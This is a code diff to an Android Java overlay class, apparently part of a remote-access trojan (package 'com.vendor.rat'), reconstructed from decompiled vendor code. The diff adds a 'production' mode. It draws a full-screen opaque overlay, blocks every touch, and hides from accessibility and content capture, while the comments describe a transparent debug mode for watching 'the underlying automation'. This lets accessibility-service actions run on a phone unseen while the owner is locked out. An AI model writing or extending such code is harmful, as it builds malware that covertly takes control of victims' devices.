@@ -3,101 +3,132 @@ package com.vendor.rat.helper;
 import android.graphics.Color;
 import android.graphics.drawable.Drawable;
 import android.os.Build;
+import android.view.MotionEvent;
 import android.view.View;
-import android.widget.LinearLayout;
-import android.widget.TextView;
+import android.widget.FrameLayout;
+import android.widget.ImageView;
 
 import com.vendor.rat.service.MyAccessibilityService;
 
 import java.lang.ref.WeakReference;
-import java.util.Objects;
 
 /**
- * Vendor: e0.g (外层容器, 59行) — 一比一复刻
+ * Vendor: e0.g (外层容器) — 一比一复刻 + 生产模式扩展
  *
- * 构造器参数: (MyAccessibilityService, String hint, Drawable background)
- * - 如果 drawable != null → setBackground(drawable)
- * - 否则 → setBackgroundColor(0xFF000000) 纯黑
- * - 创建内层 e0.i (tag="waiting-block-view") 并 addView
- * - WeakReference 指向内层 (用于 sendProgress 链路)
+ * 调试模式 (debug=1): 透明背景，可观察底层自动化操作
  *
- * onLayout: 遍历 children，找 tag="waiting-block-view" 的 child，layout 为全屏
+ * 生产模式 (debug=0): FrameLayout 层叠布局 (参考 GuideDialogHelper)
+ *   Layer 0: ImageView (背景图, CENTER_CROP, 全屏)
+ *   Layer 1: View (半透明遮罩, 全屏)
+ *   Layer 2: BlockOverlayInner (进度条+文字)
+ *   + 拦截所有触摸事件
  */
-public final class BlockOverlayView extends LinearLayout {
+public final class BlockOverlayView extends FrameLayout {
 
     // vendor: f311a — WeakReference 指向内层 (e0.i)
     public WeakReference<View> f311a;
 
+    /** 遮挡模式: true = 背景图+触控拦截 (生产), false = 透明 (调试) */
+    private final boolean blockingMode;
+
     /**
-     * vendor: e0.g 构造器 (行 19-45)
-     * 参数对齐: (service, hint, drawable)
+     * 调试模式构造器 — 透明背景，可观察自动化
      */
     public BlockOverlayView(MyAccessibilityService service, String hint, Drawable drawable) {
         super(service);
-        boolean hasDrawable = true;
+        this.blockingMode = false;
+        initCommon();
 
-        // vendor 行 22-23
-        setOrientation(VERTICAL);
-        setGravity(17); // CENTER
-
-        // vendor 行 24
-        setSystemUiVisibility(4); // SYSTEM_UI_FLAG_FULLSCREEN
-
-        // vendor 行 25
-        setImportantForAccessibility(2); // IMPORTANT_FOR_ACCESSIBILITY_NO
-
-        // vendor 行 26-28
-        if (Build.VERSION.SDK_INT >= 30) {
-            setImportantForContentCapture(2);
-        }
-
-        // vendor 行 29-33: 如果有 drawable 则设为背景，否则纯黑
-        // ADAPT: 外层设为透明，让内层半透明黑色 + 图标/进度条/文字可见
-        // vendor 外层纯黑是因为内层 onLayout 正确渲染了内容
-        // 我们的内层 onLayout 自定义布局可能导致内容不可见
-        // 所以外层用透明，视觉效果由内层 Color.argb(153,0,0,0) 提供
         if (drawable != null) {
             setBackground(drawable);
         } else {
-            setBackgroundColor(0x00000000); // 透明
+            setBackgroundColor(0x00000000);
         }
 
-        // vendor 行 37: GlobalLayoutListener (用于调整布局)
-        // ADAPT: 省略 h(this) listener，不影响核心功能
+        initInner(service, hint, false);
+    }
 
-        // vendor 行 38-39: 如果 hint 为空则不创建内层
+    /**
+     * 调试模式便捷构造器 (无 drawable)
+     */
+    public BlockOverlayView(MyAccessibilityService service, String hint) {
+        this(service, hint, (Drawable) null);
+    }
+
+    /**
+     * 生产模式私有构造器 — 由 production() 工厂方法调用
+     */
+    private BlockOverlayView(MyAccessibilityService service, String hint, int bgColor, String bgUrl) {
+        super(service);
+        this.blockingMode = true;
+        initCommon();
+
+        setBackgroundColor(bgColor);
+
+        // Layer 0: 背景图 (ImageView, CENTER_CROP, MATCH_PARENT)
+        ImageView bgImageView = new ImageView(service);
+        bgImageView.setScaleType(ImageView.ScaleType.CENTER_CROP);
+        bgImageView.setBackgroundColor(bgColor);
+        addView(bgImageView, new FrameLayout.LayoutParams(
+            FrameLayout.LayoutParams.MATCH_PARENT,
+            FrameLayout.LayoutParams.MATCH_PARENT));
+
+        BlockImageLoader.loadImage(service, bgUrl, "default_bg.png", bgImageView);
+
+        // Layer 1: 半透明遮罩层 (降低背景图亮度，确保文字可读)
+        View dimOverlay = new View(service);
+        dimOverlay.setBackgroundColor(Color.argb(100, 0, 0, 0));
+        addView(dimOverlay, new FrameLayout.LayoutParams(
+            FrameLayout.LayoutParams.MATCH_PARENT,
+            FrameLayout.LayoutParams.MATCH_PARENT));
+
+        // Layer 2: 内容层 (进度条+文字)
+        initInner(service, hint, true);
+    }
+
+    /**
+     * 生产模式工厂方法 — 调用方已解析 config，View 不依赖 MainApplication
+     *
+     * @param bgColor 背景色 (已解析，如 GuideDialogHelper.COLOR_BG)
+     * @param bgUrl   背景图 URL (空=assets/default_bg.png, http=异步下载, 本地路径=直接加载)
+     */
+    public static BlockOverlayView production(MyAccessibilityService service, String hint,
+                                               int bgColor, String bgUrl) {
+        return new BlockOverlayView(service, hint, bgColor, bgUrl);
+    }
+
+    private void initCommon() {
+        setSystemUiVisibility(4); // SYSTEM_UI_FLAG_FULLSCREEN
+        setImportantForAccessibility(2); // IMPORTANT_FOR_ACCESSIBILITY_NO
+        if (Build.VERSION.SDK_INT >= 30) {
+            setImportantForContentCapture(2);
+        }
+    }
+
+    private void initInner(MyAccessibilityService service, String hint, boolean blocking) {
         if (hint == null || hint.isEmpty()) {
             return;
         }
-
-        // vendor 行 41-44: 创建内层 e0.i
-        BlockOverlayInner inner = new BlockOverlayInner(service, hint);
+        BlockOverlayInner inner = new BlockOverlayInner(service, hint, blocking);
         inner.setTag("waiting-block-view");
-        addView(inner, 0);
+        addView(inner, new FrameLayout.LayoutParams(
+            FrameLayout.LayoutParams.MATCH_PARENT,
+            FrameLayout.LayoutParams.MATCH_PARENT));
         this.f311a = new WeakReference<>((View) inner);
     }
 
-    /**
-     * 便捷构造器 (无 drawable)
-     */
-    public BlockOverlayView(MyAccessibilityService service, String hint) {
-        this(service, hint, null);
+    // ============ 生产模式触控拦截 ============
+
+    @Override
+    public boolean onInterceptTouchEvent(MotionEvent ev) {
+        return blockingMode || super.onInterceptTouchEvent(ev);
     }
 
-    /**
-     * vendor: e0.g onLayout (行 48-58)
-     * 遍历 children，找 tag="waiting-block-view" 的 child，layout 为全屏
-     */
     @Override
-    public final void onLayout(boolean changed, int l, int t, int r, int b) {
-        int childCount = getChildCount();
-        if (childCount > 0) {
-            for (int i = 0; i < childCount; i++) {
-                View child = getChildAt(i);
-                if (Objects.equals(child.getTag(), "waiting-block-view")) {
-                    child.layout(l, t, r, b);
-                }
-            }
+    public boolean onTouchEvent(MotionEvent event) {
+        if (blockingMode) {
+            return true;
         }
+        return super.onTouchEvent(event);
     }
 }
